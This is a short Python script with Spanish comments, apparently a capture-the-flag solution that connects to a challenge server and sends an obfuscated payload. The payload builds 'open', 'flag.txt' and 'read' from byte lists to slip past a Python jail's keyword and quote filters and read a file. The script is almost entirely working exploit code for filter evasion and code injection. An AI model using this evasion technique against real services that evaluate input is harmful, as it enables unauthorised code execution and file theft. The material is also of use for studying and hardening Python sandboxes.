from pwn import remote

HOST = 'exp.cybergame.sk'
PORT = 7002

# Payload ofuscado para evadir filtros del servidor
# Equivale a: open('flag.txt').read()
# Pero sin usar las palabras prohibidas ni comillas
payload = (
    "getattr(__builtins__,bytes([111,112,101,110]).decode())"  # obtiene la función open
    "(bytes([102,108,97,103,46,116,120,116]).decode())"        # argumento: 'flag.txt'
    ".__getattribute__(bytes([114,101,97,100]).decode())()"     # llama al método read()
)

def main():
    io = remote(HOST, PORT)
    io.recvuntil(">> ")

    # Envía el payload (se ejecutará como print(<payload>))
    io.sendline(payload)

    flag = io.recvline(timeout=2).decode().strip()
    print("Flag obtenida:", flag)

if __name__ == "__main__":
    main()
